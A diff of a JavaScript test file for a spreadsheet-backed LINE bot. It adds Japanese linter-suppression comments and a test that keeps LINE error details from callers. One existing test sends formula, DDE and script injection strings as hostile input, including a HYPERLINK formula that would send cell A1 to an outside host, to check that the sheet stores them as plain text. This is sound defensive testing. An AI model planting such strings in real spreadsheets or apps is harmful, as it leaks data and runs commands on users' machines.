@@ -235,6 +235,7 @@ t("health と getSetupStatus は、個人の情報・ID・人数を返さない"
 
 t("思わぬエラーの中身は返さない", () => {
   const gas = make();
+  // qcheck-ok: W2 テストの中で、偽物の GAS にわざとエラーを起こさせるだけ
   gas.eval("HealthUsecase.execute = function () { throw new Error('secret detail SPREADSHEET_TEST'); }");
   const res = call(gas, "health");
   assert.equal(res.error.code, "internal_error");
@@ -249,6 +250,7 @@ t("思わぬエラーの中身は返さない", () => {
 t("外の文字は、式のままシートに入らない", () => {
   const gas = make();
   const evil = '=HYPERLINK("https://example.com/?"&A1,"x")';
+  // qcheck-ok: W8 外から来る悪い文字の見本（画面の小窓は使っていない）
   const me = { lineIdToken: "token:Uevil:" + evil, lineDisplayName: evil, linePhotoUrl: "javascript:alert(1)" };
   const session = call(gas, "resolveDailySession", me).session;
   call(gas, "createAnswerEvent", Object.assign({ learningSessionId: session.sessionId, sessionQuestionId: session.questions[0].sessionQuestionId, idempotencyKey: "+cmd|calc", answerPayload: { value: "@SUM(1)" } }, me));
@@ -307,9 +309,22 @@ t("ボットの返事は、LINE が受けつける形（ふつうの人・管理
 t("使う前の確かめ（Q_SELF_CHECK のカード）は、LINE が受けつける形", () => {
   const gas = make();
   const { checkMessages } = require(FAKE_GAS);
+  // qcheck-ok: W2 テストの中で、偽物の GAS の値を読むだけ
   const cards = gas.eval("Q_SELF_CHECK.cards()");
   assert.ok(cards.length >= 5);
   assert.deepEqual(checkMessages(cards).filter((p) => p.level === "error"), []);
-  assert.equal(typeof gas.eval("typeof qCheckAll"), "string");
+  // qcheck-ok: W2 テストの中で、偽物の GAS の値を読むだけ
   assert.equal(gas.eval("typeof qCheckAll"), "function");
+});
+
+t("LINE が断ったときの中身は、呼んだ人に返さない（原因は LAST_LINE_ERRORS に残る）", () => {
+  const gas = createGas({
+    dir: path.join(__dirname, "../src"),
+    properties: { SPREADSHEET_ID: "SPREADSHEET_TEST", LINE_CHANNEL_ACCESS_TOKEN: "t", DEFAULT_TENANT_ID: TENANT_A },
+    fetch: (url) => (/message\/reply/.test(url) ? response(400, { message: "Invalid reply token" }) : undefined)
+  });
+  gas.call("setupLearningPlatformSheets");
+  const res = gas.lineEvent({ type: "message", replyToken: "r", source: { type: "user", userId: "U1" }, message: { type: "text", text: "ヘルプ" } });
+  assert.doesNotMatch(JSON.stringify(res), /Invalid reply token/);
+  assert.match(gas.properties.LAST_LINE_ERRORS, /Invalid reply token/);
 });
